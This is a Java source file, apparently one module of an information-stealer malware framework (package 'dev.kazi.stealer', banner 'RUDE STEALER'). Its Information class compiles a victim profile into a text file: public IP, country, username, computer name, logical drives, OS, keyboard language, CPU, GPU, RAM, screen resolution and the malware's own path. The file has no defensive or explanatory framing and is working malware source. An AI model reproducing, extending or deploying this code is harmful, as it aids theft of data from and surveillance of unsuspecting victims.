package dev.kazi.stealer.node.nodes.impl;

import java.awt.Dimension;
import dev.kazi.stealer.main.Start;
import java.awt.Toolkit;
import java.io.FileNotFoundException;
import java.util.Scanner;
import java.io.IOException;
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.File;
import dev.kazi.stealer.utils.Util;

import java.io.BufferedWriter;
import java.io.FileWriter;
import dev.kazi.stealer.node.Category;
import dev.kazi.stealer.node.Node;

public class Information extends Node {

    public Information() {
        super(Category.FILE);
    }
    
    @Override
    public void createNode() {
        try {
            final FileWriter writer = new FileWriter(this.getFolder() + "\\Information.txt", true);
            final BufferedWriter bufferedWriter = new BufferedWriter(writer);
            bufferedWriter.write("  _____  _    _ _____  ______     _____ _______ ______          _      ______ _____  \r\n |  __ \\| |  | |  __ \\|  ____|   / ____|__   __|  ____|   /\\   | |    |  ____|  __ \\ \r\n | |__) | |  | | |  | | |__     | (___    | |  | |__     /  \\  | |    | |__  | |__) |\r\n |  _  /| |  | | |  | |  __|     \\___ \\   | |  |  __|   / /\\ \\ | |    |  __| |  _  / \r\n | | \\ \\| |__| | |__| | |____    ____) |  | |  | |____ / ____ \\| |____| |____| | \\ \\ \r\n |_|  \\_\\\\____/|_____/|______|  |_____/   |_|  |______/_/    \\_\\______|______|_|  \\_\\\r                                                                                     ");
            bufferedWriter.newLine();
            bufferedWriter.write("Date: " + Util.getTime());
            bufferedWriter.newLine();
            bufferedWriter.write("IP: " + Util.getIP());
            bufferedWriter.newLine();
            bufferedWriter.write("Country: " + Util.getCountry());
            bufferedWriter.newLine();
            bufferedWriter.newLine();
            final File propertiesFile = new File(this.getFolder(), "Properties.txt");
            if (!propertiesFile.exists()) {
                propertiesFile.createNewFile();
            }
            final BufferedReader br_os = new BufferedReader(new FileReader(this.getFolder() + "\\Properties.txt"));
            try {
                String line;
                while ((line = br_os.readLine()) != null) {
                    if (line.trim().startsWith("Operating System:")) {
                        bufferedWriter.write(line.trim().replaceAll("Operating System:", "OS:"));
                    }
                }
                br_os.close();
            }
            catch (final IOException iOException) {
                throw new RuntimeException(iOException);
            }
            bufferedWriter.newLine();
            Util.printDrives();
            final File myObj = new File(System.getProperty("user.home") + "\\Documents\\drives.txt");
            Scanner myReader;
            try {
                myReader = new Scanner(myObj);
            }
            catch (final FileNotFoundException fileNotFoundException) {
                throw new RuntimeException(fileNotFoundException);
            }
            while (myReader.hasNextLine()) {
                final String data = myReader.nextLine();
                bufferedWriter.write("Logical drives: " + data);
            }
            myReader.close();
            bufferedWriter.newLine();
            bufferedWriter.write("Current username: " + System.getProperty("user.name"));
            bufferedWriter.newLine();
            bufferedWriter.write("Computer name: " + Util.getComputerName());
            bufferedWriter.newLine();
            try {
                final BufferedReader br_key = new BufferedReader(new FileReader(this.getFolder() + "\\Properties.txt"));
                String line2;
                while ((line2 = br_key.readLine()) != null) {
                    if (line2.trim().startsWith("Language:")) {
                        bufferedWriter.write(line2.trim().replaceAll("Language:", "Keyboard:"));
                    }
                }
                br_key.close();
            }
            catch (final IOException iOException2) {
                throw new RuntimeException(iOException2);
            }
            bufferedWriter.newLine();
            bufferedWriter.newLine();
            bufferedWriter.write("CPU arch: " + Util.getCPU());
            bufferedWriter.newLine();
            bufferedWriter.write("Number of CPU kernels: " + Util.getCPUKernels());
            bufferedWriter.newLine();
            try {
                final BufferedReader br_gpu = new BufferedReader(new FileReader(this.getFolder() + "\\Properties.txt"));
                String line2;
                while ((line2 = br_gpu.readLine()) != null) {
                    if (line2.trim().startsWith("Card name:")) {
                        bufferedWriter.write(line2.trim().replaceAll("Card name:", "GPU name:").replaceAll("Unknown", "").replaceAll("GPU name: GPU name: ", "GPU name: "));
                    }
                }
                br_gpu.close();
            }
            catch (final IOException iOException2) {
                throw new RuntimeException(iOException2);
            }
            bufferedWriter.newLine();
            bufferedWriter.write("RAM: " + Util.getTotalRAM());
            bufferedWriter.newLine();
            final Dimension size = Toolkit.getDefaultToolkit().getScreenSize();
            final int width = (int)size.getWidth();
            final int height = (int)size.getHeight();
            bufferedWriter.write("Screen resolution: " + width + "x" + height);
            bufferedWriter.newLine();
            bufferedWriter.newLine();
            bufferedWriter.write("Working path: " + new File(Start.class.getProtectionDomain().getCodeSource().getLocation().toString()));
            bufferedWriter.close();
        }
        catch (final IOException iOException3) {
            throw new RuntimeException(iOException3);
        }
    }
}
